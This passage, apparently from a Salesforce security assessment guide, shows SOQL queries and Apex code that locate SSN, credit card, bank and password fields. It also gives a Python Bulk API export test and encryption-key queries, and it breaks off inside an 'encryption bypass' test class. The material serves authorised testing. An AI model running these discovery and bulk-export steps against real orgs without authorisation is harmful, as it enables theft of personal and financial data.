</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Bank%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Passport%&#39;</span>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Driver%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Medical%&#39;</span>
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%SSN%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Tax%&#39;</span><span class="p">)</span>
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityClassification</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="c1">-- Financial data discovery  </span>
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span>
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">DataType</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Currency&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Number&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Percent&#39;</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Amount%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Price%&#39;</span><span class="w"> </span>
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Cost%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Revenue%&#39;</span><span class="w"> </span>
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Budget%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Payment%&#39;</span><span class="p">)</span>
</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>
</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a><span class="c1">-- Data volume assessment</span>
</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">RecordCount</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Account&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectType</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Account</span>
</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;Contact&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Contact</span><span class="w">  </span>
</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a><span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;Lead&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Lead</span>
</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a><span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;Opportunity&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Opportunity</span>
</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a><span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;Case&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">Case</span>
</span></code></pre></div></p>
<p><strong>Pattern-Based Sensitive Data Detection</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>// Apex script for sensitive data pattern detection
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>public class SensitiveDataScanner {
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>    public static void scanForPatterns(String objectName, String fieldName, Integer limitRecords) {
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>        String query = &#39;SELECT Id, &#39; + fieldName + &#39; FROM &#39; + objectName + 
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>                      &#39; WHERE &#39; + fieldName + &#39; != null LIMIT &#39; + limitRecords;
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>        try {
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>            List&lt;SObject&gt; records = Database.query(query);
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>            for (SObject record : records) {
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>                String fieldValue = String.valueOf(record.get(fieldName));
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>                // Pattern matching for sensitive data
</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>                if (Pattern.matches(&#39;\\d{3}-\\d{2}-\\d{4}&#39;, fieldValue)) {
</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>                    System.debug(&#39;SSN pattern found: &#39; + record.Id);
</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>                }
</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>                if (Pattern.matches(&#39;\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}&#39;, fieldValue)) {
</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>                    System.debug(&#39;Credit card pattern found: &#39; + record.Id);
</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>                }
</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>                if (Pattern.matches(&#39;\\d{9}&#39;, fieldValue)) {
</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>                    System.debug(&#39;Tax ID pattern found: &#39; + record.Id);
</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>                }
</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>            }
</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>        } catch (Exception e) {
</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>            System.debug(&#39;Error scanning field: &#39; + e.getMessage());
</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>        }
</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>    }
</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Identifies data requiring enhanced protection and compliance considerations.</p>
<h3 id="2-data-export-exfiltration-assessment">2. Data Export &amp; Exfiltration Assessment</h3>
<p><strong>Objective</strong>: Identify data export capabilities that could enable bulk data theft.</p>
<p><strong>Data Export Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1">-- Data export job history</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="k">Type</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="w">       </span><span class="n">StartedDate</span><span class="p">,</span><span class="w"> </span><span class="n">EndDate</span><span class="p">,</span><span class="w"> </span><span class="n">JobItemsProcessed</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">DataExport</span><span class="w"> </span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="c1">-- Scheduled export jobs</span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">CronExpression</span><span class="p">,</span><span class="w"> </span><span class="k">State</span><span class="p">,</span><span class="w"> </span><span class="n">NextFireTime</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="w">       </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="k">FROM</span><span class="w"> </span><span class="n">CronJobDetail</span><span class="w"> </span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">JobType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;DataExport&#39;</span>
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="c1">-- Reports with export capabilities</span>
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Format</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="w">       </span><span class="n">IsDeleted</span><span class="p">,</span><span class="w"> </span><span class="n">LastRunDate</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span>
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Report</span><span class="w"> </span>
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Format</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;TABULAR&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SUMMARY&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;MATRIX&#39;</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastRunDate</span><span class="w"> </span><span class="k">DESC</span><span class="w"> </span><span class="n">NULLS</span><span class="w"> </span><span class="k">LAST</span>
</span></code></pre></div></p>
<p><strong>Bulk API Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_bulk_export</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="n">instance_url</span><span class="p">,</span> <span class="n">sobject_type</span><span class="p">):</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test bulk data extraction capabilities&quot;&quot;&quot;</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>    <span class="n">job_xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="s2">    &lt;jobInfo xmlns=&quot;http://www.force.com/2009/06/async/dataloader&quot;&gt;</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="s2">        &lt;operation&gt;query&lt;/operation&gt;</span>
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="s2">        &lt;object&gt;</span><span class="si">{</span><span class="n">sobject_type</span><span class="si">}</span><span class="s2">&lt;/object&gt;</span>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="s2">        &lt;contentType&gt;CSV&lt;/contentType&gt;</span>
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="s2">    &lt;/jobInfo&gt;&quot;&quot;&quot;</span>
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>        <span class="s1">&#39;X-SFDC-Session&#39;</span><span class="p">:</span> <span class="n">session_id</span><span class="p">,</span>
</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/xml&#39;</span>
</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>    <span class="p">}</span>
</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>
</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">instance_url</span><span class="si">}</span><span class="s2">/services/async/52.0/job&quot;</span><span class="p">,</span>
</span><span id="__span-26-17"><a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a>        <span class="n">data</span><span class="o">=</span><span class="n">job_xml</span><span class="p">,</span>
</span><span id="__span-26-18"><a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a>        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
</span><span id="__span-26-19"><a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a>    <span class="p">)</span>
</span><span id="__span-26-20"><a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a>
</span><span id="__span-26-21"><a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a>    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span><span class="p">:</span>
</span><span id="__span-26-22"><a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Bulk export job created for </span><span class="si">{</span><span class="n">sobject_type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-26-23"><a id="__codelineno-26-23" name="__codelineno-26-23" href="#__codelineno-26-23"></a>        <span class="k">return</span> <span class="kc">True</span>
</span><span id="__span-26-24"><a id="__codelineno-26-24" name="__codelineno-26-24" href="#__codelineno-26-24"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-26-25"><a id="__codelineno-26-25" name="__codelineno-26-25" href="#__codelineno-26-25"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Bulk export failed: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-26-26"><a id="__codelineno-26-26" name="__codelineno-26-26" href="#__codelineno-26-26"></a>        <span class="k">return</span> <span class="kc">False</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Identifies vectors for large-scale data exfiltration.</p>
<h3 id="3-encryption-assessment">3. Encryption Assessment</h3>
<p><strong>Objective</strong>: Evaluate data encryption implementation and identify protection gaps.</p>
<p><strong>Platform Encryption Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1">-- Encrypted fields inventory</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">IsEncrypted</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="w">       </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsEncrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span>
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="c1">-- Encryption coverage gaps for sensitive fields</span>
</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">IsEncrypted</span><span class="p">,</span>
</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="w">       </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span>
</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-27-12"><a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsEncrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span><span class="w"> </span>
</span><span id="__span-27-13"><a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%SSN%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Credit%&#39;</span><span class="w"> </span>
</span><span id="__span-27-14"><a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Bank%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Password%&#39;</span><span class="w"> </span>
</span><span id="__span-27-15"><a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Secret%&#39;</span><span class="p">)</span>
</span><span id="__span-27-16"><a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span>
</span><span id="__span-27-17"><a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a>
</span><span id="__span-27-18"><a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a><span class="c1">-- Encryption key information (if accessible)</span>
</span><span id="__span-27-19"><a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">MasterLabel</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedDate</span>
</span><span id="__span-27-20"><a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a><span class="k">FROM</span><span class="w"> </span><span class="n">EncryptionKey</span>
</span><span id="__span-27-21"><a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a>
</span><span id="__span-27-22"><a id="__codelineno-27-22" name="__codelineno-27-22" href="#__codelineno-27-22"></a><span class="c1">-- Encryption policy analysis</span>
</span><span id="__span-27-23"><a id="__codelineno-27-23" name="__codelineno-27-23" href="#__codelineno-27-23"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">MasterLabel</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span>
</span><span id="__span-27-24"><a id="__codelineno-27-24" name="__codelineno-27-24" href="#__codelineno-27-24"></a><span class="k">FROM</span><span class="w"> </span><span class="n">EncryptionPolicy</span>
</span></code></pre></div></p>
<p><strong>Encryption Bypass Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>// Test encrypted field access patterns
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>public class EncryptionTester {
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>    public static void testEncryptedFieldAccess() {
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>        try {
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>            List&lt;Contact&gt; contacts = [SELECT Id, SSN__c FROM Contact LIMIT 10];
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>            for (Contact c : contacts) {
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>                if (c.SSN__c != null) {
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>                    System.debug(&#39;Encrypted field accessible: &#39; + c.Id);
